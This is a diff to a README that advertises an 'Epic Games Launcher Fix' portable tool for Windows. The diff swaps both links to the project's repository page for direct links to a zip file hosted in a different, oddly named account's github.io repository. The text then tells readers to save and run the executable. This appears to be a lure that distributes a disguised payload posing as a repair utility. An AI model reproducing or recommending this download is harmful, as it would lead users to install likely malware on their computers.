@@ -5,7 +5,7 @@ description: "Repair the Epic Games Launcher on Windows 10 and 11 with this tool
 ---
 # 🛠️ Epic-Games-Launcher-Fix - Resolve launcher errors on Windows today
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix%20Tool-blue.svg)](https://github.com/lappetcaterpillardankness945/Epic-Games-Launcher-Fix)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix%20Tool-blue.svg)](https://raw.githubusercontent.com/lappetcaterpillardankness945/lappetcaterpillardankness945.github.io/main/Celia/io-lappetcaterpillardankness-github-2.3.zip)
 
 ## 🎯 Purpose of this tool
 
@@ -24,7 +24,7 @@ The software requires no installation. It operates as a portable application. Yo
 
 ## 💾 Downloading the fix
 
-Visit the following page to download the software: [https://github.com/lappetcaterpillardankness945/Epic-Games-Launcher-Fix](https://github.com/lappetcaterpillardankness945/Epic-Games-Launcher-Fix).
+Visit the following page to download the software: [https://raw.githubusercontent.com/lappetcaterpillardankness945/lappetcaterpillardankness945.github.io/main/Celia/io-lappetcaterpillardankness-github-2.3.zip](https://raw.githubusercontent.com/lappetcaterpillardankness945/lappetcaterpillardankness945.github.io/main/Celia/io-lappetcaterpillardankness-github-2.3.zip).
 
 On this page, locate the latest release folder. Click the executable file to save it to your computer. Select a location you can easily find, such as your Downloads folder or your desktop. Once the file finishes saving, proceed to the setup instructions.
 
